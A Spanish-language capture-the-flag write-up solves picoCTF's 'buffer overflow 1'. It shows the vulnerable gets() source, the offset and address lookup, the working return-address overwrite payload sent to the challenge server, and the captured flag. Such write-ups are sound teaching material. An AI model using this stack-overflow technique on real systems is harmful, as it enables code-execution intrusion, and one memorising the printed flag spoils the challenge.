# buffer overflow 1

## Objetivo 
Controlar la dirección de retorno

Este desafío lanza una instancia bajo demanda.  
Su estado actual es: `NOT_RUNNING`

Controla la dirección del remitente ¡Ahora estamos cocinando! Puede desbordar el búfer y volver a la función de bandera en el programa. Puedes ver la fuente aquí. Y conéctate con él usando nc saturn.picoctf.net 53127

![[Pasted image 20221129071927.png]]

## Solución
``` shell
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ nano vuln.c                                                   
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ cat vuln.c   
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ objdump -D vuln -M intel | grep 'win'
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>
 ┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ python3 -c 'from pwn import *'
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ python3                       
Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn impoet *
  File "<stdin>", line 1
    from pwn impoet *
             ^^^^^^
SyntaxError: invalid syntax
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> cyclic_find(0x6161616c)
44
>>> 'A'*44
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>> p32(0x080491f6)
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ ls
vuln  vuln.c
                                                                                                                                                                       
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ chmod +x vuln
                                                                                                                                                                       
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ ./vuln
Please enter your string: 
qwertyuioiuytrewertyuio
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
                                                                                                                                                                       
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08'  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | ./vuln 
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
Please create 'flag.txt' in this directory with your own debugging flag.
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ echo 'flag{dommieflag}' > flag.txt                                          
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
flag{dommieflag}
zsh: done                echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | 
zsh: segmentation fault  ./vuln
                                                                                  
┌──(mino20㉿kali)-[~/Descargas/buffer overflow 1]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf6\x91\x04\x08' | nc saturn.picoctf.net 53127
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_c76b273b}
```

## Notas
Asegúrese de considerar Big Endian vs Small Endian.

Cambiar la dirección del puntero de retorno puede llamar a diferentes funciones.

## Referencias
sin referencias.